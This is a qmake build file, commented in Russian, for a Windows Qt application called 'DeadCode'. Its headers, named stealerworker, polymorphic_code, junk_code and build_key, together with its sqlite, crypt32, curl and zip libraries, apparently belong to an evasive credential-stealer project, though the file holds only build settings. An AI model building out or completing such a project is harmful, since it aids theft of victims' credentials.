# Основные модули Qt (синхронизированы с build.yml)
QT += core gui network widgets qml quick svg quickcontrols2 sql

# Проверка минимальной версии Qt
lessThan(QT_MAJOR_VERSION, 5) | lessThan(QT_MINOR_VERSION, 15) {
    error("Qt 5.15.2 or higher is required. Current version: $$QT_VERSION")
}

# Имя цели и тип приложения
TARGET = DeadCode
TEMPLATE = app

# Конфигурация для релиза
CONFIG += release qtquickcompiler

# Исходные файлы
SOURCES += \
    $$PWD/../src/main.cpp \
    $$PWD/mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    $$PWD/mainwindow.h \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$PWD/../src/compat.h

# Формы Qt Designer
FORMS += \
    $$PWD/mainwindow.ui

# Файл ресурсов
RC_FILE = $$PWD/../icon.rc

# Пути для поиска заголовков
VCPKG_ROOT = $$(VCPKG_ROOT)
isEmpty(VCPKG_ROOT) {
    VCPKG_ROOT = C:/vcpkg
    warning("VCPKG_ROOT is not set, defaulting to $$VCPKG_ROOT")
}

VCPKG_INCLUDE_DIR = $$VCPKG_ROOT/installed/x64-mingw-dynamic/include
!exists($$VCPKG_INCLUDE_DIR) {
    error("vcpkg include directory not found: $$VCPKG_INCLUDE_DIR")
}

QT_DIR = $$(QT_ROOT)
isEmpty(QT_DIR) {
    QT_DIR = C:/Qt/5.15.2/mingw81_64
    warning("QT_ROOT is not set, defaulting to $$QT_DIR")
}
!exists($$QT_DIR) {
    error("Qt directory not found: $$QT_DIR")
}

INCLUDEPATH += \
    $$PWD/../src \
    $$PWD \
    $$VCPKG_INCLUDE_DIR \
    $$QT_DIR/include

# Пути для поиска QML-модулей
QML_IMPORT_PATH += \
    $$QT_DIR/qml

# Библиотеки для линковки (синхронизированы с vcpkg)
VCPKG_LIB_DIR = $$VCPKG_ROOT/installed/x64-mingw-dynamic/lib
!exists($$VCPKG_LIB_DIR) {
    error("vcpkg library directory not found: $$VCPKG_LIB_DIR")
}

LIBS += -L$$VCPKG_LIB_DIR \
    -lsqlite3 \
    -lzip \
    -lzlib \
    -lbz2 \
    -lcurl \
    -lssl \
    -lcrypto \
    -lstdc++fs \
    -lws2_32 \
    -lcrypt32 \
    -lgdi32 \
    -luser32 \
    -ladvapi32

# Флаги компилятора
QMAKE_CXXFLAGS += \
    -O2 \
    -std=c++17 \
    -Wall \
    -Wextra \
    -Werror=return-type \
    -DUNICODE \
    -D_UNICODE \
    -DWIN32 \
    -DQT_NO_DEBUG \
    -D_CRT_SECURE_NO_WARNINGS

# Флаги линковщика
QMAKE_LFLAGS += \
    -O2 \
    -Wl,-subsystem,windows

# Директории для сборки
DESTDIR = $$PWD/../build/release
OBJECTS_DIR = $$PWD/../build/release/obj
MOC_DIR = $$PWD/../build/release/moc
UI_DIR = $$PWD/../build/release/ui
RCC_DIR = $$PWD/../build/release/rcc

# Расширенный список файлов для очистки
QMAKE_CLEAN += \
    $$DESTDIR/DeadCode.exe \
    $$OBJECTS_DIR/*.o \
    $$MOC_DIR/moc_*.cpp \
    $$UI_DIR/ui_*.h \
    $$RCC_DIR/qrc_*.cpp

# Зависимости для пересборки
PRE_TARGETDEPS += \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$PWD/../src/compat.h \
    $$UI_DIR/ui_mainwindow.h